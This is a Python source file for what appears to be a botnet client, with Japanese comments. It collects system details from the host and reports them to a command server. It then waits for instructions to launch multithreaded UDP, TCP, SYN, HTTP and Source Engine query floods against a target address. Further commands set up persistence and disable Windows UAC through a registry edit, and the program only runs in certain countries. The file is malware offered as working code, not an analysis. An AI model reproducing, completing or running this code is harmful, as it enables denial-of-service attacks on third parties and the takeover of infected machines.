import socket
import uuid
import platform
import psutil
import time
import json
import threading
import os
import getpass
import sys
import requests
import util
import msgpack
import random

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def attack_vse(ip, port, secs):
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_syn(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
        except:
            pass

def attack_http(ip, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, 5050))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def check_country_code():
    try:
        # IP情報を取得する
        response = requests.get('https://ipinfo.io/country')
        response.raise_for_status()  # HTTPエラーをチェック
        
        # 国コードを取得する
        country_code = response.text.strip()
        allowed_countries = {'RU', 'BY', 'KP', 'CN', 'JP'}
        
        # 国コードが許可されたものでない場合、プログラムを終了する
        if country_code not in allowed_countries:
            sys.exit(1)  # 非ゼロでプログラムを終了

    except requests.RequestException as e:
        sys.exit(1)  # 非ゼロでプログラムを終了

def get_system_info():
    return {
        "hostname": platform.node(),
        "username": platform.uname().node,
        "global_ip": requests.get('https://ifconfig.me').text,  # ここではダミーのIPアドレスを使用します。本番ではグローバルIPを取得してください。
        "os_name": platform.system(),
        "os_version": platform.version(),
        "cpu_usage": psutil.cpu_percent(),
        "disk_usage": psutil.disk_usage('/').percent
    }

def create_session_id():
    return str(uuid.uuid4()) + getpass.getuser()[13:]

def send_periodic_updates(s, session_id, system_info):
    while True:
        update_data = {
            "session_id": session_id,
            "username": system_info["username"],
            "cpu_usage": psutil.cpu_percent(),
            "disk_usage": psutil.disk_usage('/').percent
        }
        s.sendall(json.dumps(update_data).encode())
        time.sleep(30)
        
def dataproc(data):
    return msgpack.unpackb(bytes.fromhex(data))


    
    

def receive_messages(s, session_id):
    global webcam_thread
    while True:
        try:
            data = s.recv(1024)
            if data:
                message = data.decode().strip()
                print(f"Received from server: {message}")
                
                # "all:" で始まるメッセージを処理
                if message.startswith("all:"):
                    broadcast_message = message[len("all:"):].strip()
                    print(f"Broadcast message to all clients: {broadcast_message}")
                    a = dataproc(broadcast_message)
                    # ブロードキャストメッセージに対する処理をここに追加
                    if a[0] == "DDOS":
                        if a[5] == "VSE":
                            print(a[5])
                            for _ in range(int(a[3])):
                                threading.Thread(target=attack_vse, args=(a[1], int(a[2]), float(a[4])), daemon=True).start()
                        if a[5] == "UDP":
                            print(a[5])
                            for _ in range(int(a[3])):
                                threading.Thread(target=attack_udp, args=(a[1], int(a[2]), float(a[4]), 500)).start()
                        if a[5] == "TCP":
                            print(a[5])
                            for _ in range(int(a[3])):
                                threading.thread(target=attack_tcp, args=(a[1], int(a[2]), float(a[4]), 500)).start()
                        if a[5] == "SYN":
                            print(a[5])
                            for _ in range(int(a[3])):
                                threading.Thread(target=attack_syn, args=(a[1], int(a[2]), float(a[4]))).start()
                        if a[5] == "HTTP":
                            print(a[5])
                            for _ in range(int(a[3])):
                                threading.Thread(target=attack_http, args=(a[1], float(a[4]))).start()
                                
                            
                        
                    
                    
                        
                    # 例: 特定のコマンドを実行するなど
                    continue

                # クライアント個別のメッセージを処理
                if message == "exit":
                    print("Exiting as per server's instruction.")
                    s.close()
                    os._exit(0)
                    break
                if message == "persist":
                    a = util.persist()
                    
                if message == "DisableUAC":
                    os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")

        except ConnectionResetError:
            break

def main():
    check_country_code()
    server_ip = '127.0.0.1'
    server_port = 12345

    session_id = create_session_id()
    system_info = get_system_info()
    initial_data = {
        "session_id": session_id,
        **system_info
    }

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(json.dumps(initial_data).encode())

        # サーバーからのメッセージを待つスレッドを開始
        threading.Thread(target=receive_messages, args=(s, session_id), daemon=True).start()

        # 定期的に更新を送信するスレッドを開始
        send_periodic_updates(s, session_id, system_info)

if __name__ == "__main__":
    main()
